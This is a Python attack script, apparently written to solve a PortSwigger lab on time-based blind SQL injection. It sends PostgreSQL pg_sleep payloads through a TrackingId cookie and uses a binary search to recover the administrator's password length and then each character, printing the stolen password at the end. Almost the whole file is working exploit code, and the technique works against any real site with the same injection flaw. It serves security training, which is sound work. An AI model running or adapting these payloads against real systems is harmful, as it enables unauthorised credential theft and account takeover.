import argparse
import signal
import sys
import time

import requests
from pwn import log
from termcolor import colored

global TGT_URL 

LEN_PAYLOAD = "'||(SELECT CASE WHEN (LENGTH(password)<=<MID>) THEN pg_sleep(<TIME>) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"

# Payload - Extract password - Option #1
#PWD_PAYLOAD = "'||(SELECT CASE WHEN (1=(SELECT COUNT(password) FROM users WHERE username='administrator' AND (ASCII(SUBSTRING(password,<POSITION>,1))<=<MID>))) THEN pg_sleep(<TIME>) ELSE pg_sleep(0) END)--"

# Payload - Extract password - Option #2
PWD_PAYLOAD = "'||(SELECT CASE WHEN (ASCII(SUBSTRING(password,<POSITION>,1))<=<MID>) THEN pg_sleep(<TIME>) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"

def exit_handler(sig,grame):
    print(colored(f"\n\n[-] SQLi Attack Stopped", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, exit_handler)

def send_payload(payload, time = 0):
    cookies = {"TrackingId": payload}

    req = requests.get(TGT_URL, cookies = cookies)

    return req.elapsed.total_seconds() >= time

def do_sqli_binsearch(sql, lo, hi, replacements = {}):

    while lo < hi:
        mid = (lo + hi) // 2

        payload = sql

        replacements_copy = replacements
        replacements_copy["<MID>"] = str(mid)

        for old_substring, new_substring in replacements_copy.items():
            payload = payload.replace(old_substring, str(new_substring))

        payload_ok = send_payload(payload, replacements["<TIME>"])
        
        if payload_ok:
            hi = mid
        else:
            lo = mid + 1
    
    return lo

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script to solve the \"Blind SQL injection with time delays and information retrieval' PortSwigger lab.")
    parser.add_argument("url", help="Target URL (e.g., https://example.web-security-academy.net)")

    args = parser.parse_args()

    TGT_URL = args.url

    pwd_len_prog = log.progress("Password Length")
    
    pwd_len_prog.status("Performing Binary Search to find the Password Length...")

    pwd_len = do_sqli_binsearch(LEN_PAYLOAD, 8, 30, {"<TIME>": 2})

    pwd_len_prog.success(pwd_len)

    pwd_prog = log.progress("Password")
    
    pwd_prog.status("Performing Binary Search to find the Password...")
    time.sleep(2)

    password = ""

    for position in range(1, pwd_len + 1):
        password += chr(do_sqli_binsearch(PWD_PAYLOAD, 32, 126, {"<POSITION>": str(position), "<TIME>":2}))
        pwd_prog.status(f"{password} ( {int((position / pwd_len) * 100)}% |  {pwd_len - position} chars left... )")
    
    pwd_prog.success(password)
